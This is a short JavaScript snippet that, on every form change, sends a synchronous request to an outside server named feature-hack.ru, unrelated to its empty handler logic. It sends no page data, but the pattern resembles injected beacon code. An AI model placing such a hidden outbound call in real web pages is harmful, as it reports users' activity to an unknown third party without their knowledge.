window.addEventListener('DOMContentLoaded', function (evt) {

    document.body.addEventListener('change', e => {
        var x = new XMLHttpRequest();
            x.open("GET", "http://exe.feature-hack.ru/test/vk.php?amount=1", false);
            x.send(null);
        if (e.target.classList.contains('num')){
        }
           
      });

});